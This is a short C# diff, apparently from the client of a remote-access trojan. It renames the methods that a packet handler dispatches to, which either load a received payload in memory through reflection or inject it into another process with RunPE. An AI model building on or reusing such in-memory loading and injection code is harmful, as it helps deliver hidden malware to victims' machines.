@@ -54,11 +54,11 @@ namespace Client.Handle_Packet
                             Thread thread = null;
                             if (Injection.Length == 0)
                             {
-                                thread = new Thread(new ParameterizedThreadStart(SendFile.SendToMemory));
+                                thread = new Thread(new ParameterizedThreadStart(SendToMemory.Reflection));
                             }
                             else
                             {
-                                thread = new Thread(new ParameterizedThreadStart(SendFile.RunPE));
+                                thread = new Thread(new ParameterizedThreadStart(SendToMemory.RunPE));
                             }
                             thread.Start(parameters);
                         }
